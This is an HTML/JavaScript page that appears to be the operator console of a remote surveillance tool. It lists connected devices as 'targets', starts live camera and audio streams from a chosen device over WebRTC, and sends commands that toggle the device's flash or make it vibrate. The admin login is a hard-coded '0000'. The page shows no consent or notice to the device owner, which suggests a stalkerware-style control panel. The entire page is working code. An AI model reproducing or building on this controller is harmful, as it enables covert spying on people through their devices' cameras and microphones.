<!DOCTYPE html>
<html lang="en">
<head>
    <title>LEO ADMIN HUB</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { background: #050a14; color: #fff; font-family: sans-serif; margin: 0; display: grid; grid-template-columns: 250px 1fr; height: 100vh; }
        .sidebar { background: #0a192f; border-right: 1px solid #1e3a8a; padding: 20px; }
        .user-item { background: #112240; padding: 15px; margin-bottom: 10px; border-radius: 10px; cursor: pointer; border: 1px solid transparent; font-size: 0.9rem; }
        .user-item.active { background: #00d4ff; color: #050a14; font-weight: bold; }
        .main { padding: 20px; display: flex; flex-direction: column; align-items: center; background: #050a14; }
        .video-container { width: 100%; max-width: 800px; aspect-ratio: 16/9; background: #000; border: 2px solid #00d4ff; border-radius: 15px; overflow: hidden; }
        video { width: 100%; height: 100%; object-fit: contain; }
        .controls { margin-top: 20px; display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; }
        .btn { background: #112240; border: 1px solid #00d4ff; color: #00d4ff; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; }
        .btn-unmute { background: #28a745; color: white; border: none; }
    </style>
</head>
<body>

    <div class="sidebar">
        <h3 style="color: #00d4ff;">DEVICES</h3>
        <div id="user-list"></div>
    </div>

    <div class="main">
        <div id="info" style="margin-bottom: 10px; font-size: 0.8rem; color: #8892b0;">Status: Waiting...</div>
        <div class="video-container">
            <video id="remoteVideo" autoplay playsinline></video>
        </div>
        <div class="controls">
            <button class="btn btn-unmute" onclick="unmute()">ðŸ”Š UNMUTE AUDIO</button>
            <button class="btn" onclick="sendCommand('flash')">Toggle Flash</button>
            <button class="btn" onclick="sendCommand('vibrate')">Vibrate</button>
            <button class="btn" onclick="location.reload()">Refresh Hub</button>
        </div>
    </div>
    <script>
        const socket = io();
        let currentId = null, pc;
        const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };

        socket.emit('admin-join', "0000");

        socket.on('update-targets', (list) => {
            const container = document.getElementById('user-list');
            container.innerHTML = "";
            list.forEach(id => {
                const div = document.createElement('div');
                div.className = `user-item ${currentId === id ? 'active' : ''}`;
                div.innerText = "Device_" + id.substring(0,5);
                div.onclick = () => select(id);
                container.appendChild(div);
            });
        });

        function unmute() {
            const v = document.getElementById('remoteVideo');
            v.muted = false;
            v.play();
            document.getElementById('info').innerText = "Status: Live Audio/Video Streaming";
        }

        async function select(id) {
            currentId = id;
            if(pc) pc.close();
            pc = new RTCPeerConnection(config);
            pc.onicecandidate = (e) => {
                if(e.candidate) socket.emit('signal', { to: currentId, signal: { candidate: e.candidate } });
            };
            pc.ontrack = (e) => {
                document.getElementById('remoteVideo').srcObject = e.streams[0];
            };
            socket.emit('command', { targetId: currentId, cmd: 'start-stream' });
        }
        socket.on('signal', async (data) => {
            if(data.from !== currentId) return;
            if(data.signal.sdp) {
                await pc.setRemoteDescription(new RTCSessionDescription(data.signal.sdp));
                if(data.signal.sdp.type === 'offer') {
                    const ans = await pc.createAnswer();
                    await pc.setLocalDescription(ans);
                    socket.emit('signal', { to: data.from, signal: { sdp: ans } });
                }
            } else if(data.signal.candidate) {
                await pc.addIceCandidate(new RTCIceCandidate(data.signal.candidate));
            }
        });

        function sendCommand(cmd) { socket.emit('command', { targetId: currentId, cmd: cmd }); }
    </script>
</body>
</html>
